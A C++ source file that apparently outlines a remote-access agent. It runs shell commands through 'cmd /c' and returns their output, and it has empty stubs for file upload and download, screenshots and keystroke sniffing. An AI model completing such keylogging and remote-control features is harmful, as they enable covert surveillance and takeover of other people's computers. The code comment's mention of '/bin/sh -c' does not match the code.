#include <iostream>
#include <array>
#include <boost/process.hpp>
#include <boost/log/trivial.hpp>
#include "machine.h"

namespace bp = boost::process;
void ReadStream(bp::ipstream& stream, std::string& output)
{
	std::string buff;
	while (std::getline(stream, buff))
	{
		buff.pop_back();
		buff.push_back('\n');
		output.append(buff);
	}
}

std::string Machine::RunCommand(std::string command)
{
	BOOST_LOG_TRIVIAL(info) << "Running command: " << command;

	std::string data;
	bp::ipstream out_stream, err_stream;

	// Using "/bin/sh -c" on UNIX systems.
	bp::system("cmd /c " + command, bp::std_out > out_stream, bp::std_err > err_stream);
	ReadStream(out_stream, data);
	ReadStream(err_stream, data);
	return data;
}

void Machine::UploadFile(std::string localPath, std::string remotePath)
{
}

void Machine::DownloadFile(std::string remotePath, std::string localPath)
{
}

void Machine::TakeScreenshot()
{
}

void Machine::StartKeySniffing()
{
}

void Machine::StopKeySniffing()
{
}
